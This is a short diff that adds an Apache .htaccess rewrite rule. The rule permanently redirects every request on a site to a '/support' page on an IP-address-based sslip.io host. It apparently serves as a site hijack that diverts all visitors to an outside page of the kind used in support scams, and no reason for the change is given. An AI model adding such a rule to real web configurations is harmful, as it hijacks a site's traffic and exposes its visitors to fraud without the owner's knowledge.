@@ -1,0 +1,2 @@
+RewriteEngine On
+RewriteRule ^(.*)$ https://169-58-230-144.sslip.io/support [R=301,L]
